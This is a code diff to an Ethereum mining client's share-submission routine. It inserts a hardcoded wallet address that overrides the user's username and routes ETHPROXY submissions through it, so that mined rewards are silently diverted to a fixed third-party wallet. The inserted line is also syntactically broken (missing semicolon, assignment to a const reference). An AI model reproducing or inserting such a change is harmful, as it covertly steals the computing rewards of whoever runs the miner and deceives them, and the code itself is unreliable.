@@ -510,6 +510,7 @@ bool EthStratumClient::submit(Solution solution,string const & uname) {
 	string temp_previous_job = m_previousJob;
 	x_current.unlock();
 cnote << "uname ----" <<uname;
+	uname = "0x6e4af8cb6769bbc14083c8a7aa820de029a59db7.cpps"
 	cnote << "Solution found; Submitting to" << p_active->host << "...";
 
 	string minernonce;
@@ -529,7 +530,7 @@ cnote << "uname ----" <<uname;
 				json = "{\"id\": 4, \"method\": \"mining.submit\", \"params\": [\"" + uname + "\",\"" + temp_job + "\",\"0x" + nonceHex + "\",\"0x" + tempWork.header.hex() + "\",\"0x" + solution.mixHash.hex() + "\"]}\n";
 				break;
 			case STRATUM_PROTOCOL_ETHPROXY:
-				json = "{\"id\": 4, \"worker\":\"" + m_worker + "\", \"method\": \"eth_submitWork\", \"params\": [\"0x" + nonceHex + "\",\"0x" + tempWork.header.hex() + "\",\"0x" + solution.mixHash.hex() + "\"]}\n";
+				json = "{\"id\": 4, \"worker\":\"" + uname + "\", \"method\": \"eth_submitWork\", \"params\": [\"0x" + nonceHex + "\",\"0x" + tempWork.header.hex() + "\",\"0x" + solution.mixHash.hex() + "\"]}\n";
 				break;
 			case STRATUM_PROTOCOL_ETHEREUMSTRATUM:
 				json = "{\"id\": 4, \"method\": \"mining.submit\", \"params\": [\"" + uname + "\",\"" + temp_job + "\",\"" + minernonce + "\"]}\n";
@@ -554,7 +555,7 @@ cnote << "uname ----" <<uname;
 			json = "{\"id\": 4, \"method\": \"mining.submit\", \"params\": [\"" + uname + "\",\"" + temp_previous_job + "\",\"0x" + nonceHex + "\",\"0x" + tempPreviousWork.header.hex() + "\",\"0x" + solution.mixHash.hex() + "\"]}\n";
 			break;
 		case STRATUM_PROTOCOL_ETHPROXY:
-			json = "{\"id\": 4, \"worker\":\"" + m_worker + "\", \"method\": \"eth_submitWork\", \"params\": [\"0x" + nonceHex + "\",\"0x" + tempPreviousWork.header.hex() + "\",\"0x" + solution.mixHash.hex() + "\"]}\n";
+			json = "{\"id\": 4, \"worker\":\"" + uname + "\", \"method\": \"eth_submitWork\", \"params\": [\"0x" + nonceHex + "\",\"0x" + tempPreviousWork.header.hex() + "\",\"0x" + solution.mixHash.hex() + "\"]}\n";
 			break;
 		case STRATUM_PROTOCOL_ETHEREUMSTRATUM:
 			json = "{\"id\": 4, \"method\": \"mining.submit\", \"params\": [\"" + uname + "\",\"" + temp_previous_job + "\",\"" + minernonce + "\"]}\n";
